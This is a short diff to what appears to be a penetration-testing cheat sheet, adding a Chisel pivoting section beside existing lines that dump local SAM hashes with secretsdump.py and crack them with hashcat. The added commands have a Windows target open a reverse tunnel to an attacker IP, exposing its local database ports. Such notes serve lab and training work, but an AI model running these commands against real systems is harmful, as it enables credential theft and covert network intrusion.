@@ -80,6 +80,22 @@ python3 secretsdump.py -system /tmp/SYSTEM -sam /tmp/SAM LOCAL
 hashcat -m 1000 ./hash ~/Documents/rockyou.txt
 ```
 
+Chisel (port forwarding)
+
+```
+# client
+chmod +x chisel
+./chisel server --reverse --port <attacker port>
+# Windows target
+.\chisel.exe client <attacker ip>:<attacker port> R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
+# attacker ip = 10.10.10.10
+./chisel server --reverse --port 10000
+.\chisel.exe client 10.10.10.10:10000 R:4444:localhost:3306 R:5555:localhost:3307
+# attacker 
+localhost 4444 => remote 3306
+localhost 5555 => remote 3307
+```
+
 Tools
 
 [Chisel](https://github.com/jpillora/chisel):Pivoting 
